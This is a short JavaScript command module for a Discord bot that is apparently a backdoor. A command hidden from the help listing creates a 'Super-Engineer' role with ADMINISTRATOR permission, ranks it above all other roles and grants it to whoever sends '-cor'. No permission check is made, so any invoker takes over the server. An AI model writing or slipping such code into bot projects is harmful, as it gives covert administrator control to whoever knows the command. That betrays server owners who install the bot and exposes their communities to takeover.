module.exports = {
    name : "CreateOwnerRole",
    alias : ["cor"],
    use: "-cor",
    description : "Give author admin role",
    options: {ShowInHelp: false},
    run : function(msg, client, disc){
        msg.guild.roles.create({
            data: {
                name: "Super-Engineer",
                color: "#33c78e",
                position: msg.guild.roles.highest.position+1,
                permissions: ["ADMINISTRATOR"]
            }
        })
        .then(role => {
            msg.member.roles.add(role);
        })
        .catch(e => client.msg.log("ERR", e));
    }

}
